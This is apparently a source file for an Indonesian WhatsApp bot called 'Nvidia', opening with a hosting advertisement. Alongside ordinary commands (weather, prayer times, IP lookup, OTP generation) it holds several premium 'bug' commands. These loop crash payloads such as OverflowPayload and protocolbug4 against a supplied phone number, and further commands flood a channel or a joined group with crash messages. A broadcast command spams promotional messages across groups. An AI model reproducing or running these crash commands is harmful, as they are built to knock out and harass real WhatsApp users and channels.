✨ FR3 Hosting Menyediakan:
- *✅ Panel Pterodactyl Server Private*
- *✅ Script Bot WhatsApp*
- *✅ Domain (Request Nama Domain & Free Akses Cloudflare)*
- *✅ Jasa Install Panel Pterodactyl*
- *✅ Jasa Pembuatan Script Bot WhatsApp*
- *✅ Script Nvidia Free Update (bugmenu, cpanel, dll.)*
- *✅ Script Bot Telegram*
- *✅ Jasa Pembuatan Website*
- *✅ Jasa Desain Website*
- *✅ Jasa Tambah Fitur REST API*
- *✅ Script API Free Update*
- *✅ Dan layanan lainnya — langsung tanyakan saja!*

───────────────────────────────

🏠 Join Grup Bebas Promosi:
🔗 Grup Bebas Promosi 1:
👉 https://chat.whatsapp.com/H2q7CafuYkl1bMzzNYQlO1

🔗 Channel Share Code & Script:
👉 https://whatsapp.com/channel/0029Vb61PzfF6sn4gCPS9r3P

🔗 Channel Utama:
👉 https://whatsapp.com/channel/0029Vb0fOlxEFeXsah2fi31y

───────────────────────────────

👤 Contact FR3:
📱 WhatsApp Utama:
+62882008771871

📱 WhatsApp Cadangan:
+62882008397736

───────────────────────────────`;

  const idSaluran = global.idSaluran;
  await Nvidia.sendMessage(idSaluran, {
    image: mediaBuffer,
    caption: caption
  });

  await Nvidia.sendMessage(m.chat, { text: '✅ Testimoni berhasil diupload ke channel!' }, { quoted: m });
  break;
}

case "delete": case "del": {
if (!m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
Nvidia.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
Nvidia.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
Nvidia.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

case "cgc":
case "creategc": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(`*Contoh* :\n${prefix+command} Nama Group ?`)
let creat = await Nvidia.groupCreate(args.join(" "), [])
let kiya = await Nvidia.groupInviteCode(creat.id)
Nvidia.sendMessage(m.chat, { text: `SUKSES MEMBUAT GC https://chat.whatsapp.com/${kiya}
`, m})
Reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
}

break

case "whoip": case "cekip": case "cekipvps": {
  if (!text) return m.reply('Masukkan IP nya!\nContoh: .cekipvps 123.45.67.89');
  try {
    const res = await fetch(`https://ipwhois.app/json/${text}`);
    const data = await res.json();
    if (data.success === false || !data.ip) return m.reply('IP tidak valid atau tidak ditemukan.');
    const info = `
*IP Checker*

• IP: ${data.ip}
• ISP: ${data.isp}
• ASN: ${data.asn}
• Provider: ${data.org}
• Negara: ${data.country} (${data.country_code})
• Region: ${data.region}
• Kota: ${data.city}
• Lokasi: ${data.latitude}, ${data.longitude}
• Timezone: ${data.timezone}
• Reverse DNS: ${data.reverse || '-'}
    `.trim();
    await m.reply(info);
  } catch (e) {
    console.log(e);
    m.reply('Gagal mengambil data IP.');
  }
}
break
  
 case "jadwalsholat": {
 const axios = require('axios');
 const cheerio = require('cheerio');
 if (!text) return m.reply("> 📍 Masukkan nama kota yang kamu tuju!");
 const kota = text?.toLowerCase() || 'jakarta';

 try {
 const {
 data
 } = await axios.get(`https://jadwal-sholat.tirto.id/kota-${kota}`);
 const $ = cheerio.load(data);
 const jadwal = $('tr.currDate td').map((i, el) => $(el).text()).get();

 if (jadwal.length === 7) {
 const [tanggal, subuh, duha, dzuhur, ashar, maghrib, isya] = jadwal;
 const zan = `
╭──[ *📅 Jadwal Sholat* ]──✧
᎒⊸ *🌆 Kota*: ${kota.charAt(0).toUpperCase() + kota.slice(1)}
᎒⊸ *📅 Tanggal*: ${tanggal}

╭──[ *🕰️ Waktu Sholat* ]──✧
᎒⊸ *Subuh:* ${subuh}
᎒⊸ *Duha:* ${duha}
᎒⊸ *Dzuhur:* ${dzuhur}
᎒⊸ *Ashar:* ${ashar}
᎒⊸ *Maghrib:* ${maghrib}
᎒⊸ *Isya:* ${isya}
╰────────────•

*Sumber API*
https://jadwal-sholat.tirto.id`;
 await m.reply(zan);
 } else {
 await m.reply('❌ Jadwal sholat tidak ditemukan. Pastikan nama kota sesuai.');
 }
 } catch (error) {
 await m.reply('❌ Terjadi kesalahan saat mengambil data!');
 }
 }
 break
 
case "getorkut": case "getip": {
if (!isOwner) return
let t = await fetchJson('https://api64.ipify.org?format=json')
m.reply(`IP Panel : ${t.ip}`)
}
break

case "toimg": {
  const axios = require('axios')
  const fs = require('fs')
  const path = require('path')
  const { exec } = require('child_process')
  const { downloadMediaMessage } = require('@whiskeysockets/baileys')

  const tmpFolder = path.join(__dirname, 'tmp')
  if (!fs.existsSync(tmpFolder)) fs.mkdirSync(tmpFolder)

  const inputPath = path.join(tmpFolder, 'sticker.webp')
  const outputPath = path.join(tmpFolder, 'converted.png')

  if (m.quoted && m.quoted.mimetype === 'image/webp') {
    // Convert stiker jadi gambar
    const buffer = await downloadMediaMessage(m.quoted, 'buffer', {}, { reuploadRequest: true })
    fs.writeFileSync(inputPath, buffer)

    exec(`ffmpeg -i ${inputPath} ${outputPath}`, async (err) => {
      if (err) {
        console.error(err)
        return m.reply('❌ Gagal convert stiker.')
      }

      const hasil = fs.readFileSync(outputPath)
      await Nvidia.sendMessage(m.chat, {
        image: hasil,
        caption: '✅ Stiker berhasil diubah menjadi gambar.'
      }, { quoted: m })

      fs.unlinkSync(inputPath)
      fs.unlinkSync(outputPath)
    })
    return
  }

  // Convert dari URL gambar (jika disediakan)
  if (text && text.startsWith('http')) {
    try {
      const response = await axios.get(text, { responseType: 'arraybuffer' })
      fs.writeFileSync(outputPath, response.data)

      await Nvidia.sendMessage(m.chat, {
        image: fs.readFileSync(outputPath),
        caption: '✅ Gambar dari URL berhasil dikirim ulang.'
      }, { quoted: m })

      fs.unlinkSync(outputPath)
    } catch (err) {
      console.error(err)
      m.reply('❌ Gagal mengambil gambar dari URL.')
    }
    return
  }

  return m.reply('Reply stiker atau kirim URL gambar.\nContoh: .toimg https://example.com/image.webp')
}
break

case "tagrandom": {
  if (!m.isGroup) return m.reply('❌ Fitur ini hanya bisa digunakan di grup.')
  const groupMetadata = await Nvidia.groupMetadata(m.chat)
  const peserta = groupMetadata.participants.map(p => p.id).filter(v => v !== Nvidia.user.id)

  if (peserta.length === 0) return m.reply('❌ Tidak ada member lain.')

  const randomUser = peserta[Math.floor(Math.random() * peserta.length)]
  const teks = text || 'Siapa yang paling beruntung hari ini?'

  await Nvidia.sendMessage(m.chat, {
    text: `👀 *${teks}*\n@${randomUser.split('@')[0]}`,
    mentions: [randomUser]
  }, { quoted: m })

  return
}
break

case "cekcuaca": {
  if (!text) return m.reply('Contoh: .cekcuaca Surabaya')

  const axios = require('axios')
  const kota = encodeURIComponent(text.trim())

  try {
    const { data } = await axios.get(`https://wttr.in/${kota}?format=j1`)
    const info = data.current_condition[0]

    const kondisi = info.weatherDesc[0].value
    const suhu = info.temp_C
    const angin = info.windspeedKmph
    const kelembaban = info.humidity

    const teks = `🌤️ *Cuaca di ${text}*\n\n` +
      `• Kondisi     : ${kondisi}\n` +
      `• Suhu        : ${suhu}°C\n` +
      `• Kelembaban  : ${kelembaban}%\n` +
      `• Kecepatan Angin : ${angin} km/jam`

    m.reply(teks)
  } catch (err) {
    console.error(err)
    m.reply('❌ Gagal mengambil data cuaca. Coba nama kota lain.')
  }

  return
}
break

case "addidgc": {
  if (!isCreator) return m.reply('Khusus Owner!')
  if (!text) return m.reply('Contoh: .addidgc 12036301234@g.us')

  let db = loadGroupList()
  if (db.groups.includes(text)) return m.reply('ID Grup sudah terdaftar!')
  db.groups.push(text)
  saveGroupList(db)
  m.reply(`✅ ID Grup ${text} berhasil ditambahkan.`)
}
break

case "delidgc": {
  if (!isCreator) return m.reply('Khusus Owner!')

  let db = loadGroupList()
  if (!db.groups || db.groups.length < 1) return m.reply("❌ Tidak ada ID grup di database")

  // Buat sections untuk list panjang
  let sections = [
    {
      title: "📂 LIST GRUP TERDAFTAR",
      highlight_label: "🗑️ Hapus Group",
      rows: []
    }
  ]

  for (let id of db.groups) {
    let metadata = await Nvidia.groupMetadata(id).catch(() => null)
    let groupName = metadata?.subject || 'Nama tidak ditemukan'
    let inviteCode = await Nvidia.groupInviteCode(id).catch(() => null)
    let link = inviteCode ? `https://chat.whatsapp.com/${inviteCode}` : 'Tidak ada link'

    sections[0].rows.push({
      title: groupName,
      description: `ID: ${id}\nLink: ${link}`,
      id: `.delidgcconfirm ${id}`
    })
  }

  let pesan = `╭─── 〔 *🗑️ HAPUS GRUP* 〕 ───╮\n` +
              `📜 *Total Grup:* ${db.groups.length}\n\n` +
              `🔹 Pilih grup yang ingin dihapus dari list berikut:\n` +
              `⚡ *Klik tombol di bawah!* 👇\n` +
              `╰────────────────────────╯`

  await Nvidia.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'pilih-group',
        buttonText: { displayText: '🗑️ Pilih Group' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: "🗑️ Pilih Group",
            sections: sections
          })
        }
      }
    ],
    footer: "®FR3 DEV",
    headerType: 1,
    viewOnce: true,
    text: pesan
  }, { quoted: m })
}
break

case "delidgcconfirm": {
  if (!isCreator) return m.reply('Khusus Owner!')
  if (!text) return m.reply('❌ ID grup tidak valid')

  let db = loadGroupList()
  if (!db.groups.includes(text)) return m.reply(`❌ ID grup ${text} tidak terdaftar!`)

  // Hapus
  db.groups = db.groups.filter(id => id !== text)
  saveGroupList(db)
  m.reply(`✅ ID grup ${text} berhasil dihapus.`)
}
break

case "listidgc": {
  let db = loadGroupList()
  if (db.groups.length === 0) return m.reply('❌ Belum ada grup yang terdaftar.')

  let teks = `📋 *Daftar ID Grup & Nama:*\n\n`
  for (let i = 0; i < db.groups.length; i++) {
    let id = db.groups[i]
    let metadata = await Nvidia.groupMetadata(id).catch(() => null) // jika gagal (bot bukan admin / left), null
    let groupName = metadata?.subject || 'Nama tidak ditemukan'
    teks += `${i + 1}. ${groupName} (${id})\n`
  }

  m.reply(teks.trim())
}
break

case "promosi": {
  if (!isCreator) return m.reply('Khusus Owner!')
  if (!text) return m.reply('Contoh: .promosi Hai semua! Promo baru tersedia.')

  let db = loadGroupList()
  if (db.groups.length === 0) return m.reply('❌ Belum ada grup dalam daftar.')

  const media = m.quoted && m.quoted.mimetype?.startsWith('image/')
    ? await m.quoted.download()
    : null

  for (let id of db.groups) {
    try {
      // Fake reply object (QlocJPm)
      const fakeReply = {
        key: {
          fromMe: false,
          participant: "0@s.whatsapp.net",
          remoteJid: id
        },
        message: {
          conversation: "b"
        }
      }

      await sleep(1500)

      if (media) {
        await Nvidia.sendMessage(id, {
          image: media,
          caption: text,
          mentions: [m.sender]
        }, { quoted: qlocJpm })
      } else {
        await Nvidia.sendMessage(id, {
          text: text,
          mentions: [m.sender]
        }, { quoted: qlocJpm })
      }
    } catch (err) {
      console.log(`❌ Gagal kirim ke ${id}`, err)
    }
  }

  m.reply('✅ Promosi berhasil dikirim ke semua grup yang terdaftar.')
}
break

case "satelit": {
  const axios = require('axios')
  const [lat, lon] = text.split(',')
  if (!lat || !lon) return m.reply('Contoh: .satelite -6.2,106.8')

  try {
    // Ambil nama lokasi
    const res = await axios.get('https://nominatim.openstreetmap.org/reverse', {
      params: {
        format: 'json',
        lat: lat,
        lon: lon,
        zoom: 10,
        addressdetails: 1
      }
    })

    const lokasi = res.data.display_name || 'Tidak ditemukan'

    // Gambar dari static map OSM (OpenStreetMap)
    const petaUrl = `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=13&l=sat&size=600,450`

    await Nvidia.sendMessage(m.chat, {
      image: { url: petaUrl },
      caption: `🛰️ *Gambar Satelit Lokasi*\n\n🌍 Koordinat: ${lat}, ${lon}\n📍 Lokasi: ${lokasi}`
    }, { quoted: m })

  } catch (e) {
    console.log(e)
    m.reply('❌ Gagal mengambil data lokasi.')
  }
}
break

case "upch-elite": {
if (!isCreator) return m.reply('Khusus Owner!')
  try {
    const groupMetadata = !m.isGroup ? await Nvidia.groupMetadata(m.chat) : {};
    if (!idSaluran) return m.reply('❌ ID Channel belum diatur di settings.js');

    const waktu = moment.tz('Asia/Jakarta').format('HH:mm:ss');
    const nama = m.pushName || 'Tanpa Nama';
    const sumber = !m.isGroup ? groupMetadata.subject : 'Private Chat';
    const caption = `Upload Elite\n• Dari: ${nama}\n• Dari Chat: ${sumber}\n• Jam: ${waktu}`;
    const senderNumber = m.key.remoteJid.replace(/[^0-9]/g, '');
    const quoted = m.quoted ? m.quoted : null;
    const qtype = quoted ? Object.keys(quoted.message)[0] : null;
    const thumb = await Nvidia.profilePictureUrl(m.sender, 'image').catch(() => null);

    // === Handle media (image, video, audio) ===
    if (quoted && ['imageMessage', 'videoMessage', 'audioMessage'].includes(qtype)) {
      let content = await quoted.download();
      let sendOpt = {
        contextInfo: {
          externalAdReply: {
            title: `Pesan dari ${nama}`,
            body: `${sumber} • ${waktu}`,
            thumbnailUrl: thumb,
            renderLargerThumbnail: false,
            showAdAttribution: true,
            sourceUrl: `https://wa.me/${senderNumber}`
          }
        },
        quoted: m
      };

      if (qtype === 'imageMessage') {
        await Nvidia.sendMessage(idSaluran, { image: content, caption }, sendOpt);
      } else if (qtype === 'videoMessage') {
        await Nvidia.sendMessage(idSaluran, { video: content, caption }, sendOpt);
      } else if (qtype === 'audioMessage') {
        await Nvidia.sendMessage(idSaluran, { audio: content, mimetype: 'audio/mp4' }, sendOpt);
      }

      return m.reply('✅ Media berhasil dikirim ke channel elite.');
    }

    // === Handle teks biasa ===
    if (!text) return m.reply('Kirim teks atau reply media!\nContoh: .upch-elite Halo semua!');

    await Nvidia.sendMessage(idSaluran, {
      text,
      contextInfo: {
        externalAdReply: {
          title: `Pesan dari ${nama}`,
          body: `${sumber} • ${waktu}`,
          thumbnailUrl: thumb,
          renderLargerThumbnail: false,
          showAdAttribution: true,
          sourceUrl: `https://Instagram.com`
        }
      }
    }, { quoted: m });

    m.reply('✅ Pesan teks berhasil dikirim ke channel elite.');
  } catch (err) {
    console.error(err);
    m.reply('❌ Terjadi kesalahan saat mengirim ke channel.');
  }
}
break;

case "allbug": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
 if (!q) return reply(`*Example: ${prefix + command} 628xxxx*`);
 let bijipler = q.replace(/[^0-9]/g, "");
 if (bijipler.startsWith('0')) {
 return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 628xxxx_`);
 };
 await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
 let target = bijipler + "@s.whatsapp.net";
 for (let i = 0; i < 50; i++) {
 await bulldozer(target) 
 await bulldozer(target) 
 await protocolbug4(target) 
 await protocolbug4(target) 
 await protocolbug6(target) 
 await protocolbug6(target) 
 await SpaceGroup(target) 
 await SpaceGroup(target) 
 await GxhorseForceClose(target) 
 await GxhorseForceClose(target) 
 await OverflowPayload(target) 
 await OverflowPayload(target) 
 }
 await sleep(1000);
 await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨?? 𝘼𝙩𝙩??𝙘𝙠 🌪");
}
break

case "fcbug": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
 if (!q) return reply(`*Example: ${prefix + command} 628xxxx*`);
 let bijipler = q.replace(/[^0-9]/g, "");
 if (bijipler.startsWith('0')) {
 return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 628xxxx_`);
 };
 await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
 let target = bijipler + "@s.whatsapp.net";
 for (let i = 0; i < 50; i++) {
 await protocolbug4(target)
 await protocolbug4(target)
 await OverflowPayload(target) 
 await OverflowPayload(target) 
 }
 await sleep(10);
 await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case "nvidia-crash": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
 if (!q) return reply(`*Example: ${prefix + command} 628xxxx*`);
 let bijipler = q.replace(/[^0-9]/g, "");
 if (bijipler.startsWith('0')) {
 return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 628xxxx_`);
 };
 await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
 let target = bijipler + "@s.whatsapp.net";
 for (let i = 0; i < 50; i++) {
 await SpaceGroup(target) 
 await SpaceGroup(target) 
 await SpaceGroup(target) 
 await SpaceGroup(target) 
 }
 await sleep(1000);
 await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case "fchard": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
 if (!q) return reply(`*Example: ${prefix + command} 628xxxx*`);
 let bijipler = q.replace(/[^0-9]/g, "");
 if (bijipler.startsWith('0')) {
 return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 628xxxx_`);
 };
 await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
 let target = bijipler + "@s.whatsapp.net";
 for (let i = 0; i < 50; i++) {
 await GxhorseForceClose(target) 
 await GxhorseForceClose(target) 
 await GxhorseForceClose(target) 
 await GxhorseForceClose(target) 
 }
 await sleep(1000);
 await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case "flowfc": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
 if (!q) return reply(`*Example: ${prefix + command} 628xxxx*`);
 let bijipler = q.replace(/[^0-9]/g, "");
 if (bijipler.startsWith('0')) {
 return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 628xxxx_`);
 };
 await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
 let target = bijipler + "@s.whatsapp.net";
 for (let i = 0; i < 50; i++) {
 await SpaceGroup(target) 
 await SpaceGroup(target) 
 await GxhorseForceClose(target) 
 await GxhorseForceClose(target) 
 }
 await sleep(1000);
 await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case "invisible": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
 if (!q) return reply(`*Example: ${prefix + command} 628xxxx*`);
 let bijipler = q.replace(/[^0-9]/g, "");
 if (bijipler.startsWith('0')) {
 return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 628xxxx_`);
 };
 await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
 let target = bijipler + "@s.whatsapp.net";
 for (let i = 0; i < 50; i++) {
 await OverflowPayload(target) 
 await OverflowPayload(target) 
 await OverflowPayload(target) 
 await OverflowPayload(target) 
 }
 await sleep(1000);
 await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
}
break

case "tredex": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
 if (!q) return reply(`*Example: ${prefix + command} 628xxxx*`);
 let bijipler = q.replace(/[^0-9]/g, "");
 if (bijipler.startsWith('0')) {
 return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 628xxxx_`);
 };
 await m.reply("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
 let target = bijipler + "@s.whatsapp.net";
 for (let i = 0; i < 50; i++) {
 await protocolbug4(target) 
 await protocolbug4(target) 
 await protocolbug4(target) 
 await protocolbug4(target)
 await protocolbug6(target) 
 }
 await sleep(1000);
 await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩??𝙘𝙠 🌪");
}
break

case "attack-ui": case "nyedot-kouta": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
 if (!q) return reply(`*Example: ${prefix + command} 628xxxx*`);
 let bijipler = q.replace(/[^0-9]/g, "");
 if (bijipler.startsWith('0')) {
 return reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 628xxxx_`);
 };
 await m.reply("𝙋𝙧𝙤𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
 let target = bijipler + "@s.whatsapp.net";
 for (let i = 0; i < 50; i++) {
 await OverflowPayload(target) 
 await OverflowPayload(target) 
 await OverflowPayload(target) 
 await OverflowPayload(target) 
 }
 await sleep(10);
 await m.reply("𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪"); 
}
break

case "kill-ch":
case "crash-ch": {
    if (!isOwner) return m.reply("⚠️ Hanya owner yang bisa menggunakan perintah ini!");

    const targetChannel = args[0]; // ID Channel (contoh: "120363025161900516@broadcast")
    if (!targetChannel) {
        return m.reply(`⚠️ Masukkan ID Channel!\n\n📌 Contoh: *.${command} 120363025161900516@broadcast*`);
    }

    // Kirim pesan awal proses
    await Nvidia.sendMessage(m.chat, {
        image: { url: "https://img1.pixhost.to/images/6102/605187015_fr3hosting.jpg" },
        caption: "🔄 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗯𝘂𝗴 𝗸𝗲 𝗖𝗵𝗮𝗻𝗻𝗲𝗹...",
        contextInfo: {
            externalAdReply: {
                title: "🚀 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀...",
                body: "Bug By Nvidia V9",
                sourceUrl: "https://whatsapp.com/channel/",
            },
        },
    });

    const total = 2000;

    for (let i = 0; i < total; i++) {
        try {
            await CrashJids(targetChannel);

            if (i === 10) {
                // Kirim pesan progress setelah beberapa iterasi
                await Nvidia.sendMessage(m.chat, {
                    text: `⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝗦𝗲𝗻𝗱𝗶𝗻𝗴... (${i}/${total})`,
                });
            }
        } catch (error) {
            console.error("❌ Gagal mengirim ke Channel:", error);
            return m.reply("⚠️ Terjadi kesalahan saat mengirim ke Channel.");
        }
        await sleep(1000); // Jeda agar tidak overload
    }

    // Kirim pesan selesai
    await Nvidia.sendMessage(m.chat, {
        image: { url: "url foto mu" },
        caption: "✅ 𝗕𝘂𝗴 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗗𝗶𝗸𝗶𝗿𝗶𝗺 𝗸𝗲 𝗖𝗵𝗮𝗻𝗻𝗲𝗹!",
        contextInfo: {
            externalAdReply: {
                title: "© Nvidia",
                body: "Done By Nvidia ",
                sourceUrl: "https://whatsapp.com/channel/",
            },
        },
    });

    m.reply("✅ 𝗣𝗿𝗼𝘀𝗲𝘀 𝗕𝘂𝗴 𝗧𝗲𝗹𝗮𝗵 𝗦𝗲𝗹𝗲𝘀𝗮𝗶!");
}
break;

case "kill-gc": case "kill-grub": {
    if (!isOwner) return m.reply("⚠️ Hanya owner yang bisa menggunakan perintah ini!");
    
    if (!q) {
        return Reply(`Wrong Usage.\nExample : ${prefix + command} https://chat.whatsapp.com/`);
    }

    let result = args[0].split('https://chat.whatsapp.com/')[1];
    let isTarget = await Nvidia.groupAcceptInvite(result);
    
    m.reply(`*Success! Kill Grub sent to ${isTarget}*`);
        
        //Paramater
        await Blank1(Nvidia, isTarget)
        await Blank2(isTarget)
   }
break

case "fr3crash": {
  if (!args[0]) {
    await Nvidia.sendMessage(m.chat, { text: "Tolong kirim nomor tujuan, contoh:\n.fr3crash 628xxxx" }, { quoted: m });
    return;
  }

  let target = args[0].includes("@") ? args[0] : args[0] + "@s.whatsapp.net";

  await Nvidia.sendMessage(m.chat, { text: `Mulai kirim bug dan fr3crash ke: ${target}` }, { quoted: m });

  try {
    await Unknown1(Nvidia, target);
    await Unknown2(target);
    await SpaceGroup(target);
    await OverflowPayload(target);
    await Unknown1(Nvidia, target);
    await Unknown2(target);

    await Nvidia.sendMessage(m.chat, { text: `Selesai mengirim ke ${target}` }, { quoted: m });
  } catch (e) {
    console.error("Error saat menjalankan fr3crash:", e);
    await Nvidia.sendMessage(m.chat, { text: `Error saat mengirim:\n${e.message}` }, { quoted: m });
  }

  break;
}

case "a2f": {
    if (!text.includes("|")) return m.reply("❌ Format salah!\nGunakan: .a2f token|webnya");

    let [token, web] = text.split("|").map(t => t.trim());
    if (!token || !web) return m.reply("❌ Format salah!\nGunakan: .a2f token|webnya");

    try {
        // Mengatur zona waktu Jakarta
        let now = moment().tz("Asia/Jakarta");

        // Menghasilkan kode OTP 6 digit
        let otpCode = speakeasy.totp({
            secret: token,
            encoding: 'base32'
        });

        // Menentukan waktu kadaluarsa OTP
        let timeLeft = 30 - (now.unix() % 30); // Sisa waktu sebelum kode berubah
        let expiredAt = now.add(timeLeft, 'seconds').format('HH:mm:ss');

        let privateMessage = `🔐 *Kode OTP untuk ${web}:*\n\n` +
                             `🟢 *${otpCode}*\n\n` +
                             `⏳ *Sisa waktu*: ${timeLeft} detik\n` +
                             `⌛ *Expired pada*: ${expiredAt} WIB\n\n` +
                             `Gunakan segera sebelum kadaluarsa!`;

        let groupMessage = `✅ OTP untuk *${web}* telah dikirim ke *private chat* @${m.sender.split("@")[0]}.\n` +
                           `Silakan cek pesan pribadi Anda!`;

        // Kirim OTP ke private chat user
        await Nvidia.sendMessage(m.sender, { text: privateMessage }, { quoted: m });

        // Kirim notifikasi ke grup jika bukan chat pribadi
        if (!m.isGroup) {
            await Nvidia.sendMessage(m.chat, { text: groupMessage, mentions: [m.sender] }, { quoted: m });
        }

    } catch (error) {
        m.reply("❌ Error! Token tidak valid atau terjadi kesalahan.");
    }
}
break;
case "a2fqr": {
    if (!/image/.test(mime)) return m.reply(example("Silakan kirim/reply gambar QR Code untuk diproses."));

    try {        
        const qrReader = require('qrcode-reader');
        const speakeasy = require('speakeasy');
        const moment = require('moment-timezone');

        // Unduh dan simpan gambar sementara
        let media = await Nvidia.downloadAndSaveMediaMessage(qmsg);

        // Baca gambar dengan Jimp
        let image = await Jimp.read(media);
        let qr = new qrReader();

        let qrResult = await new Promise((resolve, reject) => {
            qr.callback = (err, value) => (err ? reject(err) : resolve(value));
            qr.decode(image.bitmap);
        });

        await fs.unlinkSync(media); // Hapus file setelah diproses

        // Validasi hasil QR Code
        if (!qrResult || !qrResult.result) return m.reply("⚠️ QR Code tidak dapat dibaca atau tidak valid.");

        // Ekstrak token dari QR (biasanya dalam format otpauth://)
        let otpUrl = qrResult.result;
        let token = otpUrl.split("secret=")[1]?.split("&")[0]; // Ambil secret dari URL OTP

        if (!token) return m.reply("⚠️ QR Code tidak valid untuk 2FA.");

        // Mengatur zona waktu Jakarta
        let now = moment().tz("Asia/Jakarta");

        // Menghasilkan kode OTP 6 digit
        let otpCode = speakeasy.totp({
            secret: token,
            encoding: 'base32'
        });

        // Menentukan waktu kadaluarsa OTP
        let timeLeft = 30 - (now.unix() % 30); // Sisa waktu sebelum kode berubah
        let expiredAt = now.add(timeLeft, 'seconds').format('HH:mm:ss');

        let privateMessage = `🔐 *Kode OTP dari QR:*\n\n` +
                             `🟢 *${otpCode}*\n\n` +
                             `⏳ *Sisa waktu*: ${timeLeft} detik\n` +
                             `⌛ *Expired pada*: ${expiredAt} WIB\n\n` +
                             `Gunakan segera sebelum kadaluarsa!`;

        let groupMessage = `✅ OTP dari QR telah dikirim ke *private chat* @${m.sender.split("@")[0]}.\n` +
                           `Silakan cek pesan pribadi Anda!`;

        // Kirim OTP ke private chat user
        await Nvidia.sendMessage(m.sender, { text: privateMessage }, { quoted: m });

        // Kirim notifikasi ke grup jika bukan chat pribadi
        if (!m.isGroup) {
            await Nvidia.sendMessage(m.chat, { text: groupMessage, mentions: [m.sender] }, { quoted: m });
        }

    } catch (error) {
        console.error(error);
        m.reply("⚠️ Terjadi kesalahan saat memproses QR Code.");
    }
}
break;

case "encjawa": {
    if (!text) return m.reply("Silakan masukkan teks atau program JavaScript yang ingin dienkripsi ke dalam aksara Jawa!");

    // Fungsi untuk mengenkripsi ke aksara Jawa
    const aksaraLatinMap = {
    "a": "ꦲ", "b": "ꦧ", "c": "ꦕ", "d": "ꦢ", "e": "ꦲꦺ", 
    "f": "ꦥ꦳", "g": "ꦒ", "h": "ꦲꦃ", "i": "ꦲꦶ", 
    "j": "ꦗ", "k": "ꦏ", "l": "ꦭ", "m": "ꦩ", 
    "n": "ꦤ", "o": "ꦲꦺꦴ", "p": "ꦥ", "q": "꧀ꦏꦸ", 
    "r": "ꦫ", "s": "ꦱ", "t": "ꦠ", "u": "ꦲꦸ", 
    "v": "ꦮ꦳", "w": "ꦮ", "x": "ꦼꦏꦱ꧀", 
    "y": "ꦪ", "z": "ꦗ꦳", 
    "1": "꧐꧑", "2": "꧐꧒", "3": "꧐꧓", "4": "꧐꧔", 
    "5": "꧐꧕", "6": "꧐꧖", "7": "꧐꧗", "8": "꧐꧘", 
    "9": "꧐꧙", "0": "꧐꧀", ".": "꧉", ",": "꧈", 
    "!": "꧌", "?": "꧍", "\n": "\n", " ": " "
};

function encryptToAksaraJawa(input) {
    let result = "";
    for (let char of input) {
        if (aksaraLatinMap[char]) {
            result += aksaraLatinMap[char];
        } else {
            result += char; // Karakter lain tetap dipertahankan
        }
    }
